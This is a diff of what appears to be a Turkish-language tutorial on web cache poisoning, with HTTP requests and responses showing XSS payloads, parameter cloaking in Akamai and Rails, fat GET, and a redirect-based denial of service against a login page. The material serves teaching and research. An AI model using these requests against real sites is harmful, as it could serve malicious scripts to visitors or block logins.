-GET //?"><script>alert(1)</script> HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET //?<span style="color:DodgerBlue"><span class="s2">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span> HTTP/1.1
 Host: redacted-newspaper.net
-```
+</span></code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
-<meta property="og:url" content="//redacted-newspaper.net//?x"><script>alert(1)</script>"/>
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:url"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"//redacted-newspaper.net//?x"</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;<span class="s2">"/&gt;</span>
+</span></code></pre></div></div>
 
-Burada query, önbellek anahtarı olarak kullanılmadığı için // adresine istek atan kullanıcılar XSS yüküne maruz kalacaklar. Buradaki ikinci / işareti aslında site üzerindeki herkesi XSS yüküne maruz bırakmamak için yani güvenli test için mevcut. PURGE ile önbelleği temizleyip / adresinin bu yük ile önbelleğe alınmasını sağlarsak herkes bu XSS yüküne maruz kalacaktır. 
+Burada query, önbellek anahtarı olarak kullanılmadığı için **//** adresine istek atan kullanıcılar XSS yüküne maruz kalacaklar. Buradaki ikinci `/` işareti aslında site üzerindeki herkesi XSS yüküne maruz bırakmamak için yani güvenli test için mevcut. `PURGE` ile önbelleği temizleyip `/` adresinin bu yük ile önbelleğe alınmasını sağlarsak herkes bu XSS yüküne maruz kalacaktır. 
 
 ### Yönlendirme ile DoS
 
@@ -829,27 +799,23 @@ Anahtar olarak kullanılmayan query olduğunda ama XSS yükü yanıtlara yansıt
 
 Cloudflare’in oturum açma sayfası [dash.cloudflare.com/login](http://dash.cloudflare.com/login) adresinde bulunuyor fakat pek çok bağlantı, kullanıcıları /login/ aracılığıyla yönlendiren [cloudflare.com/login](http://cloudflare.com/login) adresine işaret ediyor. Yani kullanıcılar [cloudflare.com/login](http://cloudflare.com/login)  üzerinden giriş yapıp yönlendiriliyorlar. Bu yönlendirmeyi kendi önbellek testimiz için kullanarak, query kısmının önbellek anahtarı olarak ele alınıp alınmadığını test edebiliriz:
 
-```bash
-GET /login?x=abc HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login?x<span class="o">=</span><span style="color:DodgerBlue">abc</span> HTTP/1.1
 Host: www.cloudflare.com
-Origin: https://dontpoisoneveryone/
-```
+<span style="color:DodgerBlue">Origin: https://dontpoisoneveryone/</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 301 Moved Permanently
-Location: /login/?x=abc
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
+Location: /login/?x<span class="o">=</span><span style="color:DodgerBlue">abc</span>
+</code></pre></div></div>
 
-```bash
-GET /login HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login HTTP/1.1
 Host: www.cloudflare.com
-Origin: https://dontpoisoneveryone/
-```
+<span style="color:DodgerBlue">Origin: https://dontpoisoneveryone/</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 301 Moved Permanently
-Location: /login/?x=abc
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
+Location: <span style="color:DodgerBlue">/login/?x<span class="o">=</span>abc</span>
+</code></pre></div></div>
 
 Gördüğünüz gibi `Origin` başlığı önbellek anahtarı olarak kullanılırken, query kısmı kullanılmadığı için `Origin` aynı kalmak koşulu ile doğrudan /login path’i üzerinde de aynı önbellek yanıtı döndürüldü. 
 
@@ -874,7 +840,7 @@ HTTP/1.1 301 Moved Permanently
 Location: /login/?x=very-long-string...
 ```
 
-Tarayıcıları bu yönlendirmeyi otomatik olarak takip ettiğinde, query den önce path yoluna eklenen ekstra /  URI'yi bir bayt daha uzun hale getirir ve bunun sunucu tarafından engellenmesine neden olur:
+Tarayıcıları bu yönlendirmeyi otomatik olarak takip ettiğinde, query den önce path yoluna eklenen ekstra `/` URI'yi bir bayt daha uzun hale getirir ve bunun sunucu tarafından engellenmesine neden olur:
 
 ```bash
 GET /login/?x=very-long-string... HTTP/1.1
@@ -887,7 +853,7 @@ HTTP/1.1 414 Request-URI Too Large
 CF-Cache-Status: MISS
 ```
 
-Yani tek bir istekle Cloudflare'in giriş sayfasına giden bu rotayı ısrarla kapatabiliriz. Buradaki `Origin` başlığını güvenli test için eklemiştik. Eğer bu başlığı kaldırıp bu isteği önbelleğe aldırırsak, [cloudflare.com/login](http://cloudflare.com/login) üzerinden giriş yapmaya çalışan herkesin oturumuna mani olabiliriz. 
+Yani tek bir istekle Cloudflare'in giriş sayfasına giden bu rotayı ısrarla kapatabiliriz. Buradaki `Origin: https://dontpoisoneveryone/` başlığını güvenli test için eklemiştik. Eğer bu başlığı kaldırıp bu isteği önbelleğe aldırırsak, [cloudflare.com/login](http://cloudflare.com/login) üzerinden giriş yapmaya çalışan herkesin oturumuna mani olabiliriz. 
 
 **Ayrıca lütfen dikkat edin, bunların hepsi yönlendirme sayesindedir**; Cloudflare 414 gibi bir hata durum koduna sahip herhangi bir yanıtı önbelleğe almayı reddettiği için aşırı uzun URI'yi kendimiz göndererek bu saldırıyı yapamayız. Tam sınırdaki sayıda(aşırı uzundan 1 bayt kısa) karakter içermeli. Zaten yönlendirme sırasında path yoluna yeni bir `/` karakteri eklendiği için saldırı mümkün olur. 
 
@@ -906,7 +872,7 @@ Location: /login/?x=long-string…
 CF-Cache-Status: HIT
 ```
 
-Daha sonra bu yöntem de çözülmüş, ancak query değerini Location başlığına eklemeden önce başka dönüşüm işlemi yapan bir sunucu bulursanız bu çözümü de atlamanız mümkün olabilir.
+Daha sonra bu yöntem de çözülmüş, ancak query değerini `Location` başlığına eklemeden önce başka dönüşüm işlemi yapan bir sunucu bulursanız bu çözümü de atlamanız mümkün olabilir.
 
 ## Önbellek Parametresi Gizleme
 
@@ -928,18 +894,18 @@ GET /search?q=help?!&search=1 HTTP/1.1
 Host: example.com
 ```
 
-Önbellek anahtarını değiştirmeden “q” parametresini aşağıdaki şekilde zehirleyebiliriz:
+Önbellek anahtarını değiştirmeden “**q**” parametresini aşağıdaki şekilde zehirleyebiliriz:
 
 ```bash
 GET /search?q=help?_=payload&!&search=1 HTTP/1.1
 Host: example.com
 ```
 
-Regex, '_' parametresini kaldırmaya çalışırken, geride bir '?' bırakır. Bu nedenle,  soru işareti içeren parametreleri zehirleyebiliriz. Yani aslında farklı parametreler içeren istekleri aynı önbellek anahtarı oluşturacak şekilde önbelleğe aldırmamız mümkündür. Bu sayede son derece sıradan gözüken istekler bile zararlı yükleri barındırıyor olabilir.
+Regex, '**_**' parametresini kaldırmaya çalışırken, geride bir '**?**' bırakır. Bu nedenle, soru işareti içeren parametreleri zehirleyebiliriz. Yani aslında farklı parametreler içeren istekleri aynı önbellek anahtarı oluşturacak şekilde önbelleğe aldırmamız mümkündür. Bu sayede son derece sıradan gözüken istekler bile zararlı yükleri barındırıyor olabilir.
 
 ### Akamai
 
-Akamai örneğinde, 'akamai-transform' parametresinin önbellek anahtarına dahil edilmemesi nedeniyle parametre gizlemesi yapabiliyorsunuz. Bunun nasıl bir fayda sağladığını anlamak için detaylı bir inceleme yapalım.
+Akamai örneğinde, '**akamai-transform**' parametresinin önbellek anahtarına dahil edilmemesi nedeniyle parametre gizlemesi yapabiliyorsunuz. Bunun nasıl bir fayda sağladığını anlamak için detaylı bir inceleme yapalım.
 
 ```bash
 GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
@@ -953,23 +919,22 @@ X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
 
 Burada, `akamai-transform` parametresi önbellek anahtarına dahil edilmediği için yanıtın önbellek anahtarında görünmüyor.
 
-### Gizlenmiş Parametre ile İstek
+Akamai'nin URL ayrıştırması sayesinde, '**akamai-transform**' parametresini gizleyerek aynı önbellek anahtarını kullanabilirsiniz. Bu, farklı parametreler içeren isteklerin aynı önbellek anahtarına sahip olmasına neden olur. Yani aşağıdaki iki bağlantı da aynı önbelleği tetikler:
 
 ```bash
-GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
+GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
+Host: redacted.com
+```
+```bash
+GET /en?x=1 HTTP/1.1
 Host: redacted.com
 ```
 
-```bash
-HTTP/1.1 200 OK
-X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
-```
-
-Akamai'nin URL ayrıştırması sayesinde, 'akamai-transform' parametresini gizleyerek aynı önbellek anahtarını kullanabilirsiniz. Bu, farklı parametreler içeren isteklerin aynı önbellek anahtarına sahip olmasına neden olur. Bu durumda, saldırganın kötü amaçlı yüklerini (payload) gizleyerek sunucuya göndermesi mümkün olur ve bu yükler önbelleğe alınabilir.
+Eğer bu durumda biz **akamai-transform=zaralı-kodlar** ile zararlı kodları yanıtta barındırabilirsek, zararsız bözüken url üzerinden de bu zararlı yanıtı içeren önbellek yanıtı döndülür.
 
 ### Ruby on Rails Örneği
 
-Ruby on Rails örneğinde, ';' karakterinin parametre ayracı olarak kullanılması sayesinde parametre gizlemesi yapabiliyorsunuz.
+Ruby on Rails örneğinde, '`;`' karakterinin parametre ayracı olarak kullanılması sayesinde parametre gizlemesi yapabiliyorsunuz.
 
 Yani aslında her ikisi de aynı kabul ediliyor:
 
@@ -978,12 +943,11 @@ Yani aslında her ikisi de aynı kabul ediliyor:
 /?param1=test;param2=foo
 ```
 
-Aşağıdaki örnekte utm_content ifadesi önbellek anahtarı olarak kullanılmamak üzere ayrıştırılıyor. Ayrıştırma esnasında karmaşaya sebep olmak için aşağıdaki isteği gönderebiliriz.
+Aşağıdaki örnekte **utm_content** ifadesi önbellek anahtarı olarak kullanılmamak üzere ayrıştırılıyor. Ayrıştırma esnasında karmaşaya sebep olmak için aşağıdaki isteği gönderebiliriz.
 
-```
+```bash
 GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
 Host: example.com
-
 ```
 
 ```bash
@@ -991,7 +955,7 @@ HTTP/1.1 200 OK
 alert(1)//(some-data)
 ```
 
-Bu istekte, Ruby on Rails üç parametre görür: `callback`, `utm_content` ve `callback`. Rails, ikinci `callback` değerine öncelik verir ve saldırganın kontrolü altında olan değeri kullanır. Dolayısıyla artık normal şekilde GET ile bu standart link ziyaret edildiğinde önbellekten zararlı yükün bulunduğu yanıt getirilir.
+Bu istekte, Ruby on Rails üç parametre görür: `callback`, `utm_content` ve `callback`. Rails, ikinci `callback` değerine öncelik verir ve saldırganın kontrolü altında olan değeri kullanır. Dolayısıyla artık normal şekilde `GET` ile bu standart link ziyaret edildiğinde önbellekten zararlı yükün bulunduğu yanıt getirilir.
 
 ```bash
 GET /jsonp?callback=legit HTTP/1.1
@@ -1008,11 +972,11 @@ Bu istekte, `utm_content` parametresi önbellek anahtarına dahil edilmediği i�
 
 #### Özet
 
-Her iki örnekte de parametre gizlemesi, saldırganın kötü amaçlı yüklerini sunucuya gizlice gönderip bu yüklerin önbelleğe alınmasına ve daha sonra diğer kullanıcılar tarafından güvenli gözüken standart adresten erişilmesine olanak tanır. Bu tür saldırılar, güvenlik açıklarından yararlanarak önbellek zehirleme (cache poisoning) yapmayı mümkün kılar.
+Her iki örnekte de parametre gizlemesi, saldırganın kötü amaçlı yüklerini sunucuya gizlice gönderip bu yüklerin önbelleğe alınmasına ve daha sonra diğer kullanıcılar tarafından güvenli gözüken standart adresten erişilmesine olanak tanır.
 
 ### Anahtarsız Metod
 
-Parametreleri önbellek anahtarından gizlemenin başka bir yolu da basitçe bir POST isteği göndermektir. Bazı sistemler HTTP istek metodunu önbellek anahtarına dahil etmez. Yani POST veya GET olup olmadığına bakmaksızın önbellekleme yapabilir. 
+Parametreleri önbellek anahtarından gizlemenin başka bir yolu da basitçe bir `POST` isteği göndermektir. Bazı sistemler HTTP istek metodunu önbellek anahtarına dahil etmez. Yani `POST` veya `GET` olup olmadığına bakmaksızın önbellekleme yapabilir. 
 
 ```bash
 POST /view/o2o/shop HTTP/1.1
@@ -1027,7 +991,7 @@ HTTP/1.1 200 OK
 "_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
 ```
 
-Artık standart bir kullanıcı GET ile /view/o2o/shop adresini ziyaret ettiğinde önbellekten zararlı yükün bulunduğu yanıt döndürülecektir.
+Artık standart bir kullanıcı `GET` ile ***/view/o2o/shop*** adresini ziyaret ettiğinde önbellekten zararlı yükün bulunduğu yanıt döndürülecektir.
 
 ```bash
 GET /view/o2o/shop HTTP/1.1
@@ -1042,7 +1006,7 @@ HTTP/1.1 200 OK
 
 ### Fat GET
 
-Bazı sistemler GET isteğiyle birlikte body kısmında yer alan verileri de alırlar. Yani GET isteğinin POST gibi ele alındığı hatalı yaklaşımlar mevcut olabilir. 
+Bazı sistemler `GET` isteğiyle birlikte body kısmında yer alan verileri de alırlar. Yani `GET` isteğinin `POST` gibi ele alındığı hatalı yaklaşımlar mevcut olabilir. 
 
 Örneğin aşağıdaki isteği gönderdiğimizde, albinowax github sayfasını ziyaret edip bu kullanıcıyı kötüye kullanım şeklinde bildiren tüm kullanıcılar aslında “innocent-victim” yani başka hedef kullanıcıyı raporlamış olacaklar.
 
@@ -1055,9 +1019,9 @@ Content-Length: 22
 report=innocent-victim
 ```
 
-GET isteğindeki body kısmı kabul edilip önbelleğe alındığı için istekleri zehirlemek mümkün hale geliyor. 
+`GET` isteğindeki body kısmı önbelleğe alındığı için istekleri zehirlemek mümkün hale geliyor. 
 
-Bir diğer örnek olarak, zendesk kullanan bir hedef için aşağıdaki istek; onların giriş sayfalarını önbellek ile zehirleyecek, böylece kendi kimlik bilgilerini giren ve 'login’i tıklayan herkes, onları benim hesabımda oturum açmış halde bırakan bir yönlendirme zincirinden geçirilecek ve daha sonra oluşturdukları tüm biletlerin velayeti bana verilecek:
+Bir diğer örnek olarak, zendesk kullanan bir hedef için aşağıdaki istek; onların giriş sayfalarını önbellek ile zehirleyecek, böylece kendi kimlik bilgilerini giren ve 'login’i tıklayan herkes, onları benim hesabımda oturum açmış halde bırakan bir yönlendirme zincirinden geçirilecek ve daha sonra oluşturdukları tüm biletlerin yetkisi bana verilecek:
 
 ```bash
 GET /en-us/signin HTTP/1.1
@@ -1137,10 +1101,9 @@ server {
 
 Bu yapılandırmada `proxy_cache_key` ayarında herhangi bir sorun yok; aslında, nginx'in varsayılan cache key'ine oldukça benzer. Ancak, nginx'in `proxy_pass` belgesine [baktığınızda](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass) sorunun ipucunu bulabilirsiniz:
 
-> If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed.
-> 
+<p class="yesil">If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed.</p>
 
-Buradaki 'in the same form' (aynı biçimde) ifadesi, iletilen isteğin normalize edilmeyeceğini, oysa cache key'de saklanan istek bileşenlerinin normalleştirilebileceğini ima eder. Nginx'in cache key'e uyguladığı normalizasyon biçimlerinden biri, tam URL-çözümleme (URL-decode) işlemidir.
+Buradaki '**in the same form**' (aynı biçimde) ifadesi, iletilen isteğin normalize edilmeyeceğini, oysa cache key'de saklanan istek bileşenlerinin normalleştirilebileceğini ima eder. Nginx'in cache key'e uyguladığı normalizasyon biçimlerinden biri, tam URL-çözümleme (URL-decode) işlemidir.
 
 ### Saldırının İşleyişi
 
@@ -1185,7 +1148,7 @@ HTTP/1.1 200 OK
 <a href="/?x="/><script>alert(1)</script>
 ```
 
-Fakat bu açığı standart web tarayıcıları üzerinde uygulayamazsınız. Çünkü Modern tarayıcılar, sunucuya istekte bulunmadan önce anahtar karakterleri URL olarak kodlar ve sunucu bunların kodunu çözmez. Yani aslında sunucu tarafına aşağıdaki gibi bir istek gönderilir:
+Fakat bu açığı standart web tarayıcıları üzerinde uygulayamazsınız. Çünkü modern tarayıcılar, sunucuya istekte bulunmadan önce anahtar karakterleri URL olarak kodlar ve sunucu bunların kodunu çözmez. Yani aslında sunucu tarafına aşağıdaki gibi bir istek gönderilir:
 
 ```bash
 GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
@@ -1233,7 +1196,7 @@ X-Cache: HIT
 
 ### Önbellek Anahtarı Enjeksiyonu - Akamai
 
-Örneğin `Origin` başlığı normalde standart kullanıcıların göndermeyeceği başlıklar üzerinden sömürü gerçekleştirmemiz gerekirse ? 
+Örneğin `Origin` başlığı gibi normalde standart kullanıcıların göndermeyeceği başlıklar üzerinden sömürü gerçekleştirmemiz gerekirse ? 
 
 ```bash
 GET /?x=2 HTTP/1.1
@@ -1247,9 +1210,9 @@ X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'
 <script>…'-alert(1)-'…</script>
 ```
 
-Normalde bu tür bir açığı sömürmek mümkün değildir. Fakat Akamai tüm anahtar bileşenleri birbirinden ayıran kaçış karakterlerini anahtara dahil ederse, aşağıdaki iki istek de aynı önbellek anahtarına sahip olabilir.
+Normalde bu tür bir açığı sömürmek mümkün değildir, çünkü standart kullanıcıların tarayıcıları üzerinden `Origin: '-alert(1)-'` başlığı ile istek göndermesini sağlayamazsınız. Fakat Akamai tüm anahtar bileşenleri birbirinden ayıran `__` kaçış karakterlerini kaldırmadan önbellek anahtarına dahil ederse, aşağıdaki iki istek de aynı önbellek anahtarına sahip olabilir.
 
-İlk İstek:
+**İlk İstek:**
 
 ```bash
 GET /?x=2 HTTP/1.1
@@ -1261,7 +1224,7 @@ HTTP/1.1 200 OK
 X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
 ```
 
-İkinci istek:
+**İkinci istek:**
 
 ```bash
 GET /?x=2__Origin='-alert(1)-' HTTP/1.1
@@ -1275,7 +1238,7 @@ X-Cache: TCP_HIT
 <script>…'-alert(1)-'…</script>
 ```
 
-İlk isteği kendiniz yaparak ve kurbanınızı ikinci URL'ye yönlendirerek bu XSS'yi sömürülebilir hale getirmiş olursunuz. Çünkü ilk istek ile `Origin` başlığının önbelleğe alınmasını sağlarsınız. İkinci istekte ise `__` ayrıştırma karakteri sayesinde önbellek mekanizmasını kandırarak bir önceki istek neticesinde oluşturan önbellek anahtarı ile mevcut isteğin aynı olduğunu önbellek mekanizmasının düşünmesine sebep olursunuz. Bu stratejinin Host başlığında işe yaradığını fark ederseniz, hedef CDN'yi kullanan tüm web siteleri üzerinde tam kontrol sağlayabilirsiniz.
+İlk isteği kendiniz yaparak ve kurbanınızı ikinci URL'ye yönlendirerek bu XSS'yi sömürülebilir hale getirmiş olursunuz. Çünkü ilk istek ile `Origin` başlığının önbelleğe alınmasını sağlarsınız. İkinci istekte ise `__` ayrıştırma karakteri kaldırılmadan önbelleğe alındığı için, önbellek mekanizmasını kandırarak bir önceki istek neticesinde oluşturan önbellek anahtarı ile mevcut isteğin aynı olması sağlanmış olur. 
 
 ## Dahili Önbellek Zehirlenmesi
 
